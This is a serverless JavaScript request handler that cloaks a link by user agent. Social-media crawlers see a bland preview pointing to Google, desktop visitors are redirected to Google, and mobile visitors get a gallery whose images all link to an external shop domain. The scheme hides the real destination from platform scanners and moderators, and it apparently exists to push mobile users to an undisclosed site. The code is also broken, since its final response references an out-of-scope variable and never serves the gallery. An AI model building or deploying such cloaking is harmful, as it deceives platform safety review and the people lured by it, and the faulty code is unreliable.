export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Social media bots: Open Graph preview
  const isSocialBot =
    /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <meta property="og:title" content="Love & War">
  <meta property="og:description" content="">
  <meta property="og:image" content="https://supreme-octo-fiesta-f09.pages.dev/thumb">
  <meta property="og:url" content="https://www.google.com/">
  <meta property="og:type" content="website">
</head>
<body></body>
</html>`;

    return new Response(html, {
      headers: {
        "content-type": "text/html;charset=UTF-8",
        "cache-control": "no-store"
      }
    });
  }

  // 2. Desktop: Google 302 redirect
  const isMobile =
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (!isMobile) {
    return Response.redirect("https://www.google.com/", 302);
  }

  // 3. Mobile and other mobile devices: Gallery
  const gallery = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gallery</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: #080808;
  color: #fff;
  font-family: Arial, sans-serif;
  min-height: 100vh;
  padding: 25px 16px;
}

.header {
  text-align: center;
  padding: 12px 0 30px;
}

.header h1 {
  font-size: 25px;
  font-weight: 500;
  letter-spacing: 3px;
  color: #e5c98b;
}

.gallery {
  max-width: 1000px;
  margin: auto;
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}

.card {
  position: relative;
  display: block;
  overflow: hidden;
  text-decoration: none;
  border-radius: 16px;
  background: #151515;
  border: 1px solid rgba(214,178,105,.35);
  box-shadow: 0 10px 35px rgba(0,0,0,.5);
}

.card img {
  width: 100%;
  aspect-ratio: 4 / 5;
  object-fit: cover;
  display: block;
  transition: transform .5s ease;
}

.card:hover img {
  transform: scale(1.07);
}

.card::after {
  content: "";
  position: absolute;
  inset: 55% 0 0;
  background: linear-gradient(transparent, rgba(0,0,0,.35));
  pointer-events: none;
}

.card:hover {
  border-color: #d8b66e;
  box-shadow: 0 12px 35px rgba(199,158,83,.18);
}

@media(max-width: 650px) {
  .gallery {
    grid-template-columns: 1fr;
    max-width: 430px;
    gap: 18px;
  }

  .header {
    padding-bottom: 24px;
  }
}
</style>
</head>

<body>

<header class="header">
  <h1>GALLERY</h1>
</header>

<main class="gallery">

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/3.jpg" alt="Gallery 1">
  </a>

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/2.jpg" alt="Gallery 2">
  </a>

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/1.jpg" alt="Gallery 3">
  </a>

</main>

</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=UTF-8",
      "Cache-Control": "no-cache"
    }
  });
}
